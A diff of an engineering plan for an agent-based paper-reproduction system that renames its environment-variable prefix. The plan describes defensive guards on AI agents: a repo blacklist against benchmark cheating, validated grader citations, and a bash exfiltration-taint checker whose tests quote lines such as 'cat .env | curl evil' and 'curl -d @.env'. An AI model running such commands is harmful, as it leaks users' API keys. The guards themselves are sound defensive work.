@@ -24,7 +24,7 @@ Audience: Claude Code / Codex / human principal engineers
 - The SFT-from-traces flywheel (Appendix C — roadmap, local-only when built).
 - Replacing any agent loop, scorer, or sandbox.
 
-**Rollout discipline (invariant 8):** every phase ships its regression tests *before* the next phase becomes default-on. Additive/refactor items are default-on after tests; the three deterministic behavioral changes (hermetic isolation, metric-projection, blacklist enforcement) are default-on with a `OPENRESEARCH_*` escape hatch; the one LLM-behavioral change (citation-clamp) ships **observe-first** then flips after one SDAR run. See §10.
+**Rollout discipline (invariant 8):** every phase ships its regression tests *before* the next phase becomes default-on. Additive/refactor items are default-on after tests; the three deterministic behavioral changes (hermetic isolation, metric-projection, blacklist enforcement) are default-on with a `REPROLAB_*` escape hatch; the one LLM-behavioral change (citation-clamp) ships **observe-first** then flips after one SDAR run. See §10.
 
 ---
 
@@ -93,7 +93,7 @@ All claims below were confirmed by reading the working tree. File:line anchors a
 - `permission_mode` regression test (pins `bypassPermissions`; catches a future accidental change → invariant 4).
 - `setting_sources=[]` / `strict_mcp_config=True` assertion test.
 
-**Escape hatch:** `OPENRESEARCH_SDK_HERMETIC` (default true) disables `setting_sources=[]`/`strict_mcp_config` for local debugging.
+**Escape hatch:** `REPROLAB_SDK_HERMETIC` (default true) disables `setting_sources=[]`/`strict_mcp_config` for local debugging.
 
 **Footnote (do not block on):** `ToolSpec.input_schema` is dead. Leave it (reserved for future typed/MCP tools per Appendix A); document, do not wire this pass.
 
@@ -120,7 +120,7 @@ This is a **bug fix**, sequenced in P1 because it shares the runtime/registry su
 
 **Tests:** the paper's own repo (`github.com/BartekCupial/finetuning-RL-as-CL`, the SDAR blacklist entry) raises `RuntimeGuardViolation` from the authoring agent; a non-blacklisted framework repo (`huggingface/trl`) does not; the SDAR arXiv run (`2605.15155`) resolves a non-empty guard via `paper_hints`.
 
-**Escape hatch:** `OPENRESEARCH_BENCHMARK_GUARD` (default true). Off only for non-benchmark exploratory runs.
+**Escape hatch:** `REPROLAB_BENCHMARK_GUARD` (default true). Off only for non-benchmark exploratory runs.
 
 ---
 
@@ -138,11 +138,11 @@ This is a **bug fix**, sequenced in P1 because it shares the runtime/registry su
 ### 5b. Metric binding (DECISION: project from artifact)
 - `final_report.baseline_metrics` is **projected from the canonical experiment record's `metrics.json`** — the root no longer types metric values. The root **selects** the canonical `experiment_run_id` (deterministic fallback: the record matching the final verified state, else latest successful).
 - Model-derived/summary numbers move to a clearly **non-authoritative** narrative field (never fed to the leaderboard/scorer as ground truth). Makes RLM behave like RDR (`controller.py:1184`).
-- **Escape hatch:** `OPENRESEARCH_METRIC_PROVENANCE` (default true).
+- **Escape hatch:** `REPROLAB_METRIC_PROVENANCE` (default true).
 
 ### 5c. Invariant 7 — validated citation (DECISION: require validated citation, observe-first)
 - The LLM grader must cite a concrete `file:line` OR `metric-key` for any leaf scored > 0; the citation is **validated against the gathered evidence** (file present in code listing / key present in `metrics.json`). Uncited / unvalidatable positive → clamp 0. Label `reproduction_summary` as untrusted narration.
-- **Observe-first:** ships logging the *would-clamp* deltas (enforce-OFF) and flips to enforce after one SDAR run confirms no spurious score loss (`OPENRESEARCH_RUBRIC_REQUIRE_CITATION`).
+- **Observe-first:** ships logging the *would-clamp* deltas (enforce-OFF) and flips to enforce after one SDAR run confirms no spurious score loss (`REPROLAB_RUBRIC_REQUIRE_CITATION`).
 - Test (deterministic even for an LLM path): mock a citation-less positive → assert clamp.
 
 ---
@@ -159,7 +159,7 @@ This is a **bug fix**, sequenced in P1 because it shares the runtime/registry su
 ## 7. Guard tests + boot validator (DECISION: tests + boot validator)
 - MCP default-off test: `_resolve_mcp_servers()` returns empty when token unset; correct SSE shape + tool-extension merge when set (invariant 3).
 - Telemetry-stays-local negative test: fail if any HTTP/upload egress occurs during a run (invariant 5).
-- **BUG-LR-014** boot validator: warn (don't block) when a shell credential shadows `.env` (`OPENAI_API_KEY`/`ANTHROPIC_API_KEY`/`OPENRESEARCH_RUNPOD_API_KEY`/`APIFY_API_TOKEN`).
+- **BUG-LR-014** boot validator: warn (don't block) when a shell credential shadows `.env` (`OPENAI_API_KEY`/`ANTHROPIC_API_KEY`/`REPROLAB_RUNPOD_API_KEY`/`APIFY_API_TOKEN`).
 
 ---
 
@@ -169,15 +169,15 @@ ml-intern is **not** better than OpenResearch overall — OpenResearch leads on 
 
 | # | Borrow | ml-intern source | OpenResearch target | Phase | Default |
 |---|--------|------------------|---------------------|-------|---------|
-| 1 | **Doom-loop detector** (in-flight; sig = code **+** stdout/result hash to not kill polling) | `agent/core/doom_loop.py:104` | gap; hook `sse_bridge.py:353`; inject via REPL stderr (`safe_repl_traceback_patch.py:52` seam). Closes **BUG-LR-015** | P5 | on + `OPENRESEARCH_DOOM_LOOP` hatch |
+| 1 | **Doom-loop detector** (in-flight; sig = code **+** stdout/result hash to not kill polling) | `agent/core/doom_loop.py:104` | gap; hook `sse_bridge.py:353`; inject via REPL stderr (`safe_repl_traceback_patch.py:52` seam). Closes **BUG-LR-015** | P5 | on + `REPROLAB_DOOM_LOOP` hatch |
 | 2 | **ar5iv HTML fallback** | `papers_tool.py:721` | `arxiv.py:_fetch_html` (add `ar5iv.labs.arxiv.org/html/<id>` 2nd source, reuse existing validation) | P0 | on |
-| 3 | **Sweeper ownership guard** | `sweep_orphan_sandboxes.py:71` | `pod_sweeper.py:192-260` (add `name_prefix="openresearch-"` filter — the backend already enforces it at `runpod_backend.py:1089`) | P4 | on |
+| 3 | **Sweeper ownership guard** | `sweep_orphan_sandboxes.py:71` | `pod_sweeper.py:192-260` (add `name_prefix="reprolab-"` filter — the backend already enforces it at `runpod_backend.py:1089`) | P4 | on |
 | 4 | **Sweeper preserves in-flight** | `sweep_orphan_sandboxes.py:130` | `pod_sweep_scheduler.py:70` — feed `preserve_pod_ids` from the live-run registry (plumbed but never fed) | P4 | on |
 | 5 | **Upfront projected-cost gate** | `cost_estimation.py:219`+`agent_loop.py:338` | template-method exec (§6) | P4 | on |
 | 6 | **Chat secret-scrubber** | `redact.py:18` | `respond_to_user` (`primitives.py:4848`) + `post_message` (`messages.py:73`) — regex-scrub tokens at ingress+egress (complements, not replaces, `sse_bridge`) | P5 | on |
-| 7 | **RuntimeGuard blacklist activation** | (ml-intern `research_tool.py:108` `blocked_domains` inspired the check) | §4 | P1 | on + `OPENRESEARCH_BENCHMARK_GUARD` hatch |
-| 8 | **GitHub reference-impl discovery** (`find_examples`+`read_file`, org-allowlist + guard-gated) | `github_find_examples.py:267`, `github_read_file.py:67` | new optional tool on `baseline-implementation`; **requires #7**; needs `GITHUB_TOKEN`+`thefuzz` | P6 | **off** (`OPENRESEARCH_GITHUB_EXAMPLES`) |
-| 9 | **Run-complete notifications** | `messaging/gateway.py:24`, `slack.py:126`, `session.py:248` | hook `build_run_complete_event` (`sse_bridge.py:477`); summary-only ⇒ invariant-5-safe | P6 | off (`OPENRESEARCH_NOTIFY_*`) |
+| 7 | **RuntimeGuard blacklist activation** | (ml-intern `research_tool.py:108` `blocked_domains` inspired the check) | §4 | P1 | on + `REPROLAB_BENCHMARK_GUARD` hatch |
+| 8 | **GitHub reference-impl discovery** (`find_examples`+`read_file`, org-allowlist + guard-gated) | `github_find_examples.py:267`, `github_read_file.py:67` | new optional tool on `baseline-implementation`; **requires #7**; needs `GITHUB_TOKEN`+`thefuzz` | P6 | **off** (`REPROLAB_GITHUB_EXAMPLES`) |
+| 9 | **Run-complete notifications** | `messaging/gateway.py:24`, `slack.py:126`, `session.py:248` | hook `build_run_complete_event` (`sse_bridge.py:477`); summary-only ⇒ invariant-5-safe | P6 | off (`REPROLAB_NOTIFY_*`) |
 | 10 | Validate-saved-model on resume | `session_resume.py:224` | `resume_run` (`live_runs.py:583`) | P4 | on |
 | 11 | Leaderboard percentiles | `build_kpis.py:131` `_percentile` + zero-exclusion | `leaderboard.py:150` (cost p50/p95 per paper/model) | P5 | on |
 | M1 | Root-model rate-limit backoff | `agent_loop.py:411` (2-tier, total>60s) | `claude_oauth_client.py:309`, OpenAI client | P4 | on |
@@ -208,7 +208,7 @@ The ecosystem is ~90% prompt/config/observability collections (cost dashboards, 
 | C1 | **Deterministic bash source→sink EXFIL taint** — a sensitive source (`.env`, `~/.aws`, key files) piped or command-substituted into a network sink (curl/wget/nc/DNS-tunnel) | `vaporif/parry-guard` `crates/exfil/src/{bash.rs,consts.rs}` — port the RULESET only | `RuntimeGuard` (`base.py:72`), today a lowercase **substring scan of paper-repo URLs only** (verified: ZERO structural bash analysis / no exfil detection in `backend/`). Add a deterministic taint check on the §4 seam — detective (`claude_runtime.py:101-107`) in P1, preventive (`can_use_tool`) in P1.5. Closes the host-secret-exfil hole the URL blocklist can't see (invariant-4 spirit). | **P1.5** (also enriches P1 detective) |
 | C2 | (optional, low marginal) destructive-bash allow/prompt/block tier (catch a sub-agent `rm -rf`-ing the run dir) | `ldayton/Dippy` / parry `crates/destructive` | same seam | P1.5 (take from parry) |
 
-**Scope discipline:** port the *ruleset* (literal sink/source/sensitive-path/DNS-tunnel lists + the pipeline/command-substitution source→sink rule) into a small Python checker reusing `bashlex`/tree-sitter. **REJECT the Rust crate and parry's DeBERTa/Llama prompt-injection ML half** (heavy deps; root-prompt-injection ≠ benchmark integrity). `OPENRESEARCH_BENCHMARK_GUARD`-gated. Attribute: `# exfil sink/taint ruleset adapted from vaporif/parry-guard crates/exfil (MIT)`. Rationale is live, not hypothetical: the run's own `.env` holds plaintext API keys, so a compromised sub-agent has a real exfil target today.
+**Scope discipline:** port the *ruleset* (literal sink/source/sensitive-path/DNS-tunnel lists + the pipeline/command-substitution source→sink rule) into a small Python checker reusing `bashlex`/tree-sitter. **REJECT the Rust crate and parry's DeBERTa/Llama prompt-injection ML half** (heavy deps; root-prompt-injection ≠ benchmark integrity). `REPROLAB_BENCHMARK_GUARD`-gated. Attribute: `# exfil sink/taint ruleset adapted from vaporif/parry-guard crates/exfil (MIT)`. Rationale is live, not hypothetical: the run's own `.env` holds plaintext API keys, so a compromised sub-agent has a real exfil target today.
 
 ---
 
@@ -218,7 +218,7 @@ The ecosystem is ~90% prompt/config/observability collections (cost dashboards, 
 - **P1 — Provider-runtime hardening:** Gap A parity + hermetic (§3) **+ RuntimeGuard blacklist activation (#7, §4, DETECTIVE)** — same registry/runtime surface. Tests: parity, permission_mode, hermetic, fail-closed empty-tools, blacklist-blocks-paper-repo, SDAR-arxiv-nonempty-guard.
 - **P1.5 — Preventive guard (scheduled follow-up; grill-resolved 2026-05-31):** rework `claude_runtime` to streaming-input mode + a permission model where `can_use_tool` fires (deny-on-blocked instead of relying on `bypassPermissions`), so a blocked fetch is *prevented*, not just detected-after-the-fact. Bigger blast radius (every tool routes through the callback) ⇒ its own phase after P1's detective guard + tests land. **Also lands C1 (§8b): the parry-guard-derived bash exfil-taint ruleset** so the preventive guard catches host-secret exfiltration (`curl -d @.env …`), not just paper-repo URLs. Tests: `can_use_tool` denies a Bash command referencing a blocked term before execution; an exfil pipeline (`cat .env | curl evil`) is denied.
 - **P2 — Manifest (§5a): DONE** (`b733b30`/`0031398`/`f86e84f`) — enrich `experiment_runs.jsonl` (run_id/env_id/commands/sandbox_backend/metrics_sha256) + `final_report` back-link. Additive. Tests: `test_p2_manifest.py` (15) manifest fields + back-link round-trip. (`commands.log` revival moved to P4 — see §5a.)
-- **P3 — Scoring truth:** **§5b DONE** (`7152a78`) — `baseline_metrics` projected from the canonical experiment record (RDR pattern), root numbers → non-authoritative `reported_metrics`, `OPENRESEARCH_METRIC_PROVENANCE` hatch, honesty guard preserved as fallback. **B1 DONE** (`2cbdf97`, §8a) — adversarial-grader stance + citation requirement in `_SYSTEM_PROMPT`. **REMAINING (observe-first, needs a SDAR run to validate before enforcing):** §5c PROGRAMMATIC citation validation + clamp (`OPENRESEARCH_RUBRIC_REQUIRE_CITATION`); B2 spec-gate-before-quality short-circuit. Tests done: projection-from-artifact, hatch-off, honesty-guard-preserved, grader-stance guards.
+- **P3 — Scoring truth:** **§5b DONE** (`7152a78`) — `baseline_metrics` projected from the canonical experiment record (RDR pattern), root numbers → non-authoritative `reported_metrics`, `REPROLAB_METRIC_PROVENANCE` hatch, honesty guard preserved as fallback. **B1 DONE** (`2cbdf97`, §8a) — adversarial-grader stance + citation requirement in `_SYSTEM_PROMPT`. **REMAINING (observe-first, needs a SDAR run to validate before enforcing):** §5c PROGRAMMATIC citation validation + clamp (`REPROLAB_RUBRIC_REQUIRE_CITATION`); B2 spec-gate-before-quality short-circuit. Tests done: projection-from-artifact, hatch-off, honesty-guard-preserved, grader-stance guards.
 - **P4 — Budget/runtime (§6):** template-method + watchdog unify + conformance test + #5,#3,#4,#10,M1,M3,M4 **+ `commands.log` revival** (moved from P2 — the template-method appends a `CommandLogEntry` per `exec` in one place). Tests: Brev/local budget inheritance, upfront gate, sweeper ownership+preserve, watchdog-on-RDR, conformance (all backends), commands.log-per-exec.
 - **P5 — Loop & egress safety + guards:** doom-loop (#1), chat scrubber (#6), MCP default-off test, telemetry-egress test, boot validator (BUG-LR-014), leaderboard percentiles (#11).
 - **P6 — Capability (after P1's #7):** GitHub reference-impl tool (#8, default-OFF, allowlist+guard-gated), run-complete notifications (#9, off-by-default). Tests: allowlist+guard reject blacklisted/non-allowlisted repos; notification fires on completion with summary-only payload.
@@ -231,18 +231,18 @@ The ecosystem is ~90% prompt/config/observability collections (cost dashboards, 
 
 | Change | Class | Default | Flag |
 |--------|-------|---------|------|
-| Gap A tools/hermetic | tighten | on after tests | `OPENRESEARCH_SDK_HERMETIC` (hermetic only) |
-| RuntimeGuard blacklist (#7) | behavioral (deterministic) | on after tests | `OPENRESEARCH_BENCHMARK_GUARD` |
+| Gap A tools/hermetic | tighten | on after tests | `REPROLAB_SDK_HERMETIC` (hermetic only) |
+| RuntimeGuard blacklist (#7) | behavioral (deterministic) | on after tests | `REPROLAB_BENCHMARK_GUARD` |
 | Manifest (§5a) | additive | on after tests | — |
-| Metric-projection (§5b) | behavioral (deterministic) | on after tests | `OPENRESEARCH_METRIC_PROVENANCE` |
-| Citation-clamp (§5c) | behavioral (LLM) | **observe-first → flip post-SDAR** | `OPENRESEARCH_RUBRIC_REQUIRE_CITATION` |
+| Metric-projection (§5b) | behavioral (deterministic) | on after tests | `REPROLAB_METRIC_PROVENANCE` |
+| Citation-clamp (§5c) | behavioral (LLM) | **observe-first → flip post-SDAR** | `REPROLAB_RUBRIC_REQUIRE_CITATION` |
 | Budget template-method + #5/#3/#4/M1/M4 (§6) | refactor/additive | on after tests | — |
 | M3 price-catalog | additive | off (no URL ⇒ static) | `RUNPOD_PRICE_CATALOG_URL` |
-| Doom-loop (#1) | additive (in-flight inject) | on after tests | `OPENRESEARCH_DOOM_LOOP` |
+| Doom-loop (#1) | additive (in-flight inject) | on after tests | `REPROLAB_DOOM_LOOP` |
 | Chat scrubber (#6) | additive | on after tests | — |
 | Guard tests / boot validator | additive (warn) | on | — |
-| GitHub tool (#8) | net-new capability | **off** | `OPENRESEARCH_GITHUB_EXAMPLES` (+`GITHUB_TOKEN`) |
-| Notifications (#9) | net-new capability | off (empty config) | `OPENRESEARCH_NOTIFY_*` |
+| GitHub tool (#8) | net-new capability | **off** | `REPROLAB_GITHUB_EXAMPLES` (+`GITHUB_TOKEN`) |
+| Notifications (#9) | net-new capability | off (empty config) | `REPROLAB_NOTIFY_*` |
 
 ---
 
